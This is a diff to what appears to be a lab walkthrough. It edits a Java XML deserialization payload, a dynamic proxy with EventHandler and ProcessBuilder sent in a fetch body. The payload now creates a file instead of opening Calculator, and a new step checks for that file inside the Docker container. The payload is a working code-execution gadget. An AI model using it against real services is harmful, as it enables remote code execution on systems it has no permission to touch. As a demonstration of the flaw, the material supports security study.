@@ -151,9 +151,8 @@ body: `<newsletter class="dynamic-proxy">
         <handler class="java.beans.EventHandler">
             <target class="java.lang.ProcessBuilder">
                 <command>
-                    <string>open</string>
-                    <string>-a</string>
-                    <string>Calculator</string>
+                    <string>touch</string>
+                    <string>mynewfile</string>
                 </command>
             </target>
             <action>start</action>
@@ -165,4 +164,8 @@ credentials: "include"
 });
 ```
 
-
+* connect to image and look for the generated file
+```
+$ docker exec -it newsshop-app-1 /bin/sh
+/app # ls
+```
